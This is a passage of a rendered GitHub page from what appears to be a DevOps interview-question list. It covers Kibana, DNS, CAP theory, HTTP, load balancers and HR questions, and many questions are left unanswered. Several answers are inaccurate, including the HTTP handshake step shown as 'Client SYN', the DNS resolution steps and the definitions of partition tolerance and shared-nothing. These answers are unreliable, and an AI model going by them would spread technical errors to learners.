&lt;h5&gt;&lt;a id="user-content-kibana" class="anchor" aria-hidden="true" href="#kibana"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Kibana&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is Kibana?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;From the official docs:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"Kibana is an open source analytics and visualization platform designed to work with Elasticsearch. You use Kibana to search, view, and interact with data stored in Elasticsearch indices. You can easily perform advanced data analysis and visualize your data in a variety of charts, tables, and maps."
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What visualization types are supported/included in Kibana?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What visualization type would you use for statistical outliers&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe in detail how do you create a dashboard in Kibana&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-beats" class="anchor" aria-hidden="true" href="#beats"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Beats&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is Filebeat?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-elastic-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advnaced" class="anchor" aria-hidden="true" href="#star-advnaced"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advnaced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Describe how would an architecture of production environment with large amounts of data would be different from a small-scale environment&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;There are several possible answers for this question. One of them is as follows:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A small-scale architecture of elastic will consist of the elastic stack as it is. This means we will have beats, logstash, elastcsearch and kibana.&lt;br&gt;
A production environment with large amounts of data can include some kind of buffering component (e.g. Reddis or RabbitMQ) and also security component such as Nginx.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-dns" class="anchor" aria-hidden="true" href="#dns"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DNS&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-dns-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-28" class="anchor" aria-hidden="true" href="#baby-beginner-28"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is DNS? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;DNS (Domain Name Systems) is a protocol used for converting domain names into IP addresses.&lt;br&gt;
As you know computer networking is done with IP addresses (layer 3 of the OSI model) but for as humans it's hard to remember IP addresses, it's much easier to remember names. This why we need something such as DNS to convert any domain name we type into an IP address. You can think on DNS as a huge phonebook or database where each corresponding name has an IP.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How DNS works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;In general the process is as follows:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;The user types an address in the web browser (some_site.com)&lt;/li&gt;
&lt;li&gt;The operating system gets a request from the browser to translate the address the user entered&lt;/li&gt;
&lt;li&gt;A query created to check a local entry of the address exists in the system. In case it doesn't, the request is forwarded to the DNS resolver&lt;/li&gt;
&lt;li&gt;The Resolver is a server, usually configured by your ISP when you connect to the internet, that responsible for resolving your query by contacting other DNS servers&lt;/li&gt;
&lt;li&gt;The Resolver contacts the root nameserver (aka as .)&lt;/li&gt;
&lt;li&gt;The root nameserver responds with the address of the relevant Top Level Domain DNS server (if your address ends with org then the org TLD)&lt;/li&gt;
&lt;li&gt;The Resolver then contacts the TLD DNS and TLD DNS responds with the IP address that matches the address the user typed in the browser&lt;/li&gt;
&lt;li&gt;The Resolver passes this information to the browser&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;The user is happy :D
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What types of DNS records are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;A&lt;/li&gt;
&lt;li&gt;PTR&lt;/li&gt;
&lt;li&gt;MX&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;AAAA
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is a A record?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a AAAA record?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a PTR record?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;While an A record points a domain name to an IP address, a PTR record does the opposite and resolves the IP address to a domain name.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a MX record?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Is DNS using TCP or UDP?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Round Robin DNS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is DNS Record TTL? Why do we need it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a zone? What types of zones are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-distributed" class="anchor" aria-hidden="true" href="#distributed"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Distributed&lt;/h2&gt;
&lt;details&gt;
&lt;summary&gt;Explain Distributed Computing (or Distributed System)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;According to Martin Kleppmann:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"Many processes running on many machines...only message-passing via an unreliable network with variable delays, and the system may suffer from partial failures, unreliable clocks, and process pauses."
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Do you know what is "CAP theorem"? (aka as Brewer's theorem)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;According to the CAP theorem, it's not possible for a distributed data store to provide more than two of the following at the same time:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Availability: Every request receives a response (it doesn't has to be the most recent data)&lt;/li&gt;
&lt;li&gt;Consistency: Every request receives a response with the latest/most recent data&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Partition tolerance: Even if some the data is lost/dropped, the system keeps running
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is "Shared-Nothing" architecture?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;It's an architecture in which data is and retrieved from a single, non-shared, source usually exclusively connected to one node as opposed to architectures where the request can get to one of many nodes and the data will be retrieved from one shared location (storage, memory, ...).
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-general" class="anchor" aria-hidden="true" href="#general"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;General&lt;/h2&gt;
&lt;h5&gt;&lt;a id="user-content-http" class="anchor" aria-hidden="true" href="#http"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HTTP&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is HTTP?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe HTTP request lifecycle&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Resolve host by request to DNS resolver&lt;/li&gt;
&lt;li&gt;Client SYN&lt;/li&gt;
&lt;li&gt;Server SYN+ACK&lt;/li&gt;
&lt;li&gt;Client SYN&lt;/li&gt;
&lt;li&gt;HTTP request&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;HTTP response
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;True or False? HTTP is stateful&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;False. Server doesn't maintain state for incoming request.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How HTTP request looks like?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;It consits of:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Request line - request type&lt;/li&gt;
&lt;li&gt;Headers - content info like length, enconding, etc.&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Body (not always included)
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What HTTP method types are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;GET&lt;/li&gt;
&lt;li&gt;POST&lt;/li&gt;
&lt;li&gt;HEAD&lt;/li&gt;
&lt;li&gt;PUT&lt;/li&gt;
&lt;li&gt;DELETE&lt;/li&gt;
&lt;li&gt;CONNECT&lt;/li&gt;
&lt;li&gt;OPTIONS&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;TRACE
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What HTTP response codes are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;1xx - informational&lt;/li&gt;
&lt;li&gt;2xx - Success&lt;/li&gt;
&lt;li&gt;3xx - Redirect&lt;/li&gt;
&lt;li&gt;4xx - Error, client fault&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;5xx - Error, server fault
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is HTTPS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain HTTP Cookies&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;HTTP is stateless. To share state, we can use Cookies.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;TODO: explain what is actually a Cookie
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is HTTP Pipelining?&lt;/summary&gt;&lt;br&gt;&lt;b&gt; 
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a proxy?&lt;/summary&gt;&lt;br&gt;&lt;b&gt; 
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a reverse proxy?&lt;/summary&gt;&lt;br&gt;&lt;b&gt; 
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is CDN?&lt;/summary&gt;&lt;br&gt;&lt;b&gt; 
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;When you publish a project, you usually publish it with a license. What types of licenses are you familiar with and which one do you prefer to use?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-load-balancers-1" class="anchor" aria-hidden="true" href="#load-balancers-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Load Balancers&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is a load balancer?&lt;/summary&gt;&lt;br&gt;&lt;b&gt; 
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What load balancer algorithms are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an Application Load Balancer?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-random" class="anchor" aria-hidden="true" href="#random"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Random&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How a search engine works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is faster than RAM?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a memory leak?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is your favorite protocol?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;SSH
HTTP
DHCP
DNS
...
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Cache API?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the C10K problem? Is it relevant today?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;a href="https://idiallo.com/blog/c10k-2016" rel="nofollow"&gt;https://idiallo.com/blog/c10k-2016&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-hr" class="anchor" aria-hidden="true" href="#hr"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HR&lt;/h2&gt;
&lt;p&gt;Although the following questions are not DevOps related, they are still quite common and part of the DevOps interview process so it's better to prepare for them as well.&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Tell us little bit about yourself&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Tell me about your last big project/task you worked on&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What was most challenging part in the project you worked on?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Why do you want to work here?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How did you hear about us?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Tell them how did you hear about them :D
Relax, there is no wrong or right answer here...I think.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How would you describe a good leadership? What makes a good boss for you?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Tell me about a time where you didn't agree on an implementation&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you deal with a situation where key stakeholders are not around and a big decision needs to be made? &lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Where do you see yourself in 5 years?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Some ideas (some of them bad and should not be used):&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Senior DevOps&lt;/li&gt;
&lt;li&gt;Manager&lt;/li&gt;
&lt;li&gt;Retirement&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Your manager
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Give an example of a time you were able to change the view of a team about a particular tool/project/technology&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Have you ever caused a service outage? (or broke a working project, tool, ...?)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;If you worked in this area for more than 5 years it's hard to imagine the answer would be no. It also doesn't have to be big service outage. Maybe you merged some code that broke a project or its tests. Simply focus on what you learned from such experience.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Rank the following in order 1 to 5, where 1 is most important: salaray, benefits, career, team/people, work life balance&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You know best your order just have a good thought if you really want to put salary in top or bottom....
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;You have three important tasks scheduled for today. One is for your boss, second for a colleague who is also a friend, third is for a customer. All tasks are equally important. What do you do first?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You have a colleague you don‘t get along with. Tell us some strategies how you create a good work relationship with them anyway.&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Bad answer: I don't.
Better answer: Every person has strengths and weaknesses. This is true also for colleagues I don't have good work relationship with and this is what helps me to create good work relationship with them. If I am able to highlight or recognize their strengths I'm able to focus mainly on that when communicating with them.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What do you love about your work?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You know the best, but some ideas if you find it hard to express yourself:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Diversity&lt;/li&gt;
&lt;li&gt;Complexity&lt;/li&gt;
&lt;li&gt;Challenging&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Communication with several different teams
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are your responsibilities in your current position?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You know the best :)
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Why should we hire you for the role?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You can use and elaborate on one or all of the following:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Passion&lt;/li&gt;
&lt;li&gt;Motivation&lt;/li&gt;
&lt;li&gt;Autodidact&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Creativity (be able to support it with some actual examples)
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

